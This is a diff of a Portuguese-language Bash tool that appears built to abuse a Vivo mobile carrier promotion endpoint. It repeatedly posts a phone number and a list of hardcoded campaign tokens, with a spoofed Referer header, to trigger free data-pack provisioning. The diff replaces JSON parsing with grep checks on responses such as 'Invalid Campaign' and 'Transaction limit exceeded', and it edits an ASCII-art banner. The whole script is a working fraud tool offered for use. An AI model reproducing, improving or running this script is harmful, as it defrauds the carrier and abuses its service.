@@ -1,4 +1,4 @@
-tit=$"ㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠋⠉⠙⠻⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣶⣶⣦⣬⢹⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⣰⣧⡀⠄⠄⠄⠄⠈⢙⡋⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠰⠼⢯⣿⣿⣦⣄⠄⠄⠄⠈⢡⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠸⠤⠕⠛⠙⠷⣿⡆⠄⠄⠄⣸⣿⣿⡏⣼⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⢡⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣄⠄⢀⠄⠄⢀⣤⣾⣿⣿⣿⢃⣾⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⠿⣛⣡⣄⣀⠄⠠⢴⣿⣿⡿⣄⣴⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣩⡽⡁⢸⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⢃⣿⣿⢟⣿⣿⣿⣿⣿⣮⢫⣿⣿⣿⣿⣿⣟⢿⠃⠄⢻⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡿⣸⠟⣵⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⢰⡄⢿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡇⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⡎⣿⣿⣿\n\e[33;01m██▀ﾠ█▄█ﾠ█ﾠ▄▀▀ﾠ▄▀▄ﾠ█▀▄ﾠ██▀ﾠ█▄ﾠ█ﾠ██▀ﾠ█▀▄\n█▄▄ﾠ█ﾠ█ﾠ█ﾠ▄██ﾠ▀▄▀ﾠ█▀ﾠﾠ█▄▄ﾠ█ﾠ▀█ﾠ█▄▄ﾠ█▀▄\e[0m\nㅤㅤ⡀⠈⢿⠄⣿⡇⠄⠙⠿⣿⡿⠿⢋⣥⣾⣿⣷⣌⠻⢿⣿⣿⡿⠟⣡⣾⣿⣿⠿⢋\nㅤㅤ⠛⠳⠄⢠⣿⠇⠄⣷⡑⢶⣶⢿⣿⣿⣿⣽⣿⣿⣿⣶⣶⡐⣶⣿⠿⠛⣩⡄⠄⢸"
+tit=$"ㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠋⠉⠙⠻⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣶⣶⣦⣬⢹⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⣰⣧⡀⠄⠄⠄⠄⠈⢙⡋⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠰⠼⢯⣿⣿⣦⣄⠄⠄⠄⠈⢡⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠸⠤⠕⠛⠙⠷⣿⡆⠄⠄⠄⣸⣿⣿⡏⣼⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⢡⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣄⠄⢀⠄⠄⢀⣤⣾⣿⣿⣿⢃⣾⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⠿⣛⣡⣄⣀⠄⠠⢴⣿⣿⡿⣄⣴⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣩⡽⡁⢸⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⢃⣿⣿⢟⣿⣿⣿⣿⣿⣮⢫⣿⣿⣿⣿⣿⣟⢿⠃⠄⢻⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡿⣸⠟⣵⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⢰⡄⢿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡇⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⡎⣿⣿⣿\nㅤㅤ⣭⣍⠛⠿⠄⢰⠋⡉⠹⣿⣿⣿⣿⣿⣿⠙⣿⣿⣿⣿⣿⣿⡟⢁⠙⡆⢡⣿⣿⣿\nㅤㅤ⠻⣿⡆⠄⣤⠈⢣⣈⣠⣿⣿⣿⣿⣿⠏⣄⠻⣿⣿⣿⣿⣿⣆⣈⣴⠃⣿⣿⣿⣿\nㅤㅤ⡀⠈⢿⠄⣿⡇⠄⠙⠿⣿⡿⠿⢋⣥⣾⣿⣷⣌⠻⢿⣿⣿⡿⠟⣡⣾⣿⣿⠿⢋\nㅤㅤ⠛⠳⠄⢠⣿⠇⠄⣷⡑⢶⣶⢿⣿⣿⣿⣽⣿⣿⣿⣶⣶⡐⣶⣿⠿⠛⣩⡄⠄⢸"
 tokens=$(echo "91e22bd5-7b79-4fef-8dfa-c40f1ff3736b
 db6327ec-3ad5-46a4-881e-1deff71c879a
 02f76cd1-eead-44ff-88dd-aa69538c7aef
@@ -180,19 +180,34 @@ veri=$(echo -e "\e[01;37m Opção: \e[0m")
                           for i in $(seq $VEZES);
                              do
                           response=$(data=$"msisdn=$numero&campid=$tokens2&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://a.vivo.ddivulga.com/" -d "${data}")
-                          body=$(echo $response | jq '.packprovision')
-                          pack=$'"packprovisionOK"'
-                              case $o in
-                              $qtdtokens) mssg=$(echo "FINALIZANDO");;
-                                       *) mssg=$(echo "INICIANDO O PRÓXIMO")
-                              esac
-                              case $body in
-                                   null) echo -e "\e[01;33m MB INDISPONIVEL NESSE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
-                                  $pack) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
-                                      *) echo "ALGO DEU ERRADO"; echo $response; break
-                              esac
-                             done
-                            done
+                          grepi=$(echo $response | grep -c "Invalid Campaign")
+         case $grepi in
+              1) echo -e "\e[01;33m TOKEN RETORNOU INVÁLIDO! TENTE OUTRO\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+     grepi2=$(echo $response | grep -c "Transaction limit exceeded")
+         case $grepi2 in
+              1) echo -e "\e[01;33m LIMITE DE TENTATIVAS EXCEDIDO NESTE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi3=$(echo $response | grep -c "Not eligible")
+         case $grepi3 in
+              1) echo -e "\e[01;33m TOKEN BOM! MAS O CHIP NÃO ESTÁ ELEGÍVEL NELE\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi4=$(echo $response | grep -c "packprovisionOK")
+         case $grepi4 in
+              1) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+              *)
+         esac
+body=$(echo $response | jq '.packprovision')
+                                pack=$'"packprovisionOK"'
+                                case $o in
+                                  $qtdtokens) mssg=$(echo "FINALIZANDO");;
+                                           *) mssg=$(echo "INICIANDO O PRÓXIMO")
+                                           esac
+    done
+   done
                           echo -e "         ≡ \e[01;37mO P Ç Õ E S\e[0m ≡"
                           echo -e " \e[00;31m══════════════\e[0m\e[01;37m︾\e[00;31m═══════════════\e[0m"
                           echo -e " \e[01;37m〘*1*〙\e[0m\e[01;04;33mIR AO TESTADOR PADRÃO\e[0m\c"; echo -e "\e[02;03;37m   Apenas cole o numero\e[0m"
@@ -230,19 +245,34 @@ veri=$(echo -e "\e[01;37m Opção: \e[0m")
                                 for i in $(seq $VEZES);
                                   do
                                 response=$(data=$"msisdn=$NUMERO&campid=$tokens2&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://a.vivo.ddivulga.com/" -d "${data}")
-                                body=$(echo $response | jq '.packprovision')
+                                grepi=$(echo $response | grep -c "Invalid Campaign")
+         case $grepi in
+              1) echo -e "\e[01;33m TOKEN RETORNOU INVÁLIDO! TENTE OUTRO\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+     grepi2=$(echo $response | grep -c "Transaction limit exceeded")
+         case $grepi2 in
+              1) echo -e "\e[01;33m LIMITE DE TENTATIVAS EXCEDIDO NESTE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi3=$(echo $response | grep -c "Not eligible")
+         case $grepi3 in
+              1) echo -e "\e[01;33m TOKEN BOM! MAS O CHIP NÃO ESTÁ ELEGÍVEL NELE\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi4=$(echo $response | grep -c "packprovisionOK")
+         case $grepi4 in
+              1) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+              *)
+         esac
+body=$(echo $response | jq '.packprovision')
                                 pack=$'"packprovisionOK"'
                                 case $o in
                                   $qtdtokens) mssg=$(echo "FINALIZANDO");;
                                            *) mssg=$(echo "INICIANDO O PRÓXIMO")
-                                esac 
-                                case $body in
-                                   null) echo -e "\e[01;33m MB INDISPONIVEL NESSE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
-                                  $pack) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
-                                      *) echo "ALGO DEU ERRADO"; echo $response; break
-                               esac
-                              done
-                             done
+                                           esac
+    done
+   done
                            echo -e "         ≡ \e[01;37mO P Ç Õ E S\e[0m ≡"
                            echo -e " \e[00;31m══════════════\e[0m\e[01;37m︾\e[00;31m═══════════════\e[0m"
                            echo -e " \e[01;37m〘*1*〙\e[0m\e[01;04;33mREPETIR TESTADOR PADRÃO\e[0m\c"; echo -e "\e[02;03;37m Apenas cole o numero\e[0m"
@@ -340,17 +370,32 @@ veri=$(echo -e "\e[01;37m Opção: \e[0m")
                     for i in $(seq $VEZES);
                        do
                     response=$(data=$"msisdn=$numero&campid=$tokens2&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://a.vivo.ddivulga.com/" -d "${data}")
-                    body=$(echo $response | jq '.packprovision')
-                    pack=$'"packprovisionOK"'
-                        case $o in
-                        $qtdtokens) mssg=$(echo "FINALIZANDO");;
-                                 *) mssg=$(echo "INICIANDO O PRÓXIMO")
-                        esac
-                     case $body in
-                          null) echo -e "\e[01;33m MB INDISPONIVEL NESSE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
-                         $pack) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
-                             *) echo "ALGO DEU ERRADO"; echo $response; break
+                    grepi=$(echo $response | grep -c "Invalid Campaign")
+         case $grepi in
+              1) echo -e "\e[01;33m TOKEN RETORNOU INVÁLIDO! TENTE OUTRO\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+     grepi2=$(echo $response | grep -c "Transaction limit exceeded")
+         case $grepi2 in
+              1) echo -e "\e[01;33m LIMITE DE TENTATIVAS EXCEDIDO NESTE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi3=$(echo $response | grep -c "Not eligible")
+         case $grepi3 in
+              1) echo -e "\e[01;33m TOKEN BOM! MAS O CHIP NÃO ESTÁ ELEGÍVEL NELE\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi4=$(echo $response | grep -c "packprovisionOK")
+         case $grepi4 in
+              1) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+              *)
                      esac
+body=$(echo $response | jq '.packprovision')
+                          pack=$'"packprovisionOK"'
+                              case $o in
+                              $qtdtokens) mssg=$(echo "FINALIZANDO");;
+                                       *) mssg=$(echo "INICIANDO O PRÓXIMO")
+                                       esac
                      done
                      done
                           echo -e "         ≡ \e[01;37mO P Ç Õ E S\e[0m ≡"
@@ -386,16 +431,29 @@ veri=$(echo -e "\e[01;37m Opção: \e[0m")
                             for i in $(seq $VEZES);
                                do
                             response=$(data=$"msisdn=$NUMERO&campid=$tokens2&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://a.vivo.ddivulga.com/" -d "${data}")
-                            body=$(echo $response | jq '.packprovision')
-                            pack=$'"packprovisionOK"'
+                            grepi=$(echo $response | grep -c "Invalid Campaign")
+         case $grepi in
+              1) echo -e "\e[01;33m TOKEN RETORNOU INVÁLIDO! TENTE OUTRO\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+     grepi2=$(echo $response | grep -c "Transaction limit exceeded")
+         case $grepi2 in
+              1) echo -e "\e[01;33m LIMITE DE TENTATIVAS EXCEDIDO NESTE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi3=$(echo $response | grep -c "Not eligible")
+         case $grepi3 in
+              1) echo -e "\e[01;33m TOKEN BOM! MAS O CHIP NÃO ESTÁ ELEGÍVEL NELE\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi4=$(echo $response | grep -c "packprovisionOK")
+         case $grepi4 in
+              1) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+              *)
+         esac
                               case $o in
-                             $qtdtokens) mssg=$(echo "FINALIZANDO");;
-                                      *) mssg=$(echo "INICIANDO O PRÓXIMO")
-                              esac 
-                              case $body in
-                                   null) echo -e "\e[01;33m MB INDISPONIVEL NESSE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
-                                  $pack) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
-                                      *) echo "ALGO DEU ERRADO"; echo $response; break
+                        $qtdtokens) mssg=$(echo "FINALIZANDO");;
+                                 *) mssg=$(echo "INICIANDO O PRÓXIMO")
                               esac
                             done
                             done
@@ -446,17 +504,30 @@ veri=$(echo -e "\e[01;37m Opção: \e[0m")
           for i in $(seq $VEZES);
              do
          response=$(data=$"msisdn=$NUMERO&campid=$tokens2&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -H "Referer: http://a.vivo.ddivulga.com/" -d "${data}")
-         body=$(echo $response | jq '.packprovision')
-         pack=$'"packprovisionOK"'
+         grepi=$(echo $response | grep -c "Invalid Campaign")
+         case $grepi in
+              1) echo -e "\e[01;33m TOKEN RETORNOU INVÁLIDO! TENTE OUTRO\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+     grepi2=$(echo $response | grep -c "Transaction limit exceeded")
+         case $grepi2 in
+              1) echo -e "\e[01;33m LIMITE DE TENTATIVAS EXCEDIDO NESTE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi3=$(echo $response | grep -c "Not eligible")
+         case $grepi3 in
+              1) echo -e "\e[01;33m TOKEN BOM! MAS O CHIP NÃO ESTÁ ELEGÍVEL NELE\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
+              *)
+         esac
+    grepi4=$(echo $response | grep -c "packprovisionOK")
+         case $grepi4 in
+              1) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+              *)
+         esac
              case $o in
-             $qtdtokens) mssg=$(echo "FINALIZANDO");;
-                      *) mssg=$(echo "INICIANDO O PRÓXIMO")
+                        $qtdtokens) mssg=$(echo "FINALIZANDO");;
+                                 *) mssg=$(echo "INICIANDO O PRÓXIMO")
              esac 
-             case $body in
-                  null) echo -e "\e[01;33m MB INDISPONIVEL NESSE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
-                 $pack) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
-                     *) echo "ALGO DEU ERRADO"; echo $response; break
-             esac
             done
            done
                             echo -e "         ≡ \e[01;37mO P Ç Õ E S\e[0m ≡"
